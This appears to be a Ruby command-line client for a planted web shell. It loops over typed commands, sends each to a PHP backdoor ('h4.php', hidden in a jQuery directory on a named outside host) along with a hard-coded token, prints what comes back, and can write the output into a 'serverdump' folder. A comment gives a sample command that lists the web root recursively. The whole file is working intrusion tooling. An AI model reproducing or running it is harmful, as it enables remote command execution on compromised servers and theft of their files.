require "net/http"
require "colorize"

# ls -la /var/www -R <<:< log.txt
flag = 0

while true
	print ">".red
	data = gets.chomp
	if data.include? ">>:>"
		file = File.open("serverdump/"+data[data.index(">>:>")+5..data.length], "w")
		data = data[0..data.index(">>:>")-1]
		flag = 1
	end
	res = Net::HTTP.get('supersecretsite.csgoskinmine.com', "/js/jquery/h4.php?tok=h4x8f.98554&ex=#{data}")
	puts res
	if flag == 1
		file.puts res
		file.close
	end
	flag = 0
end
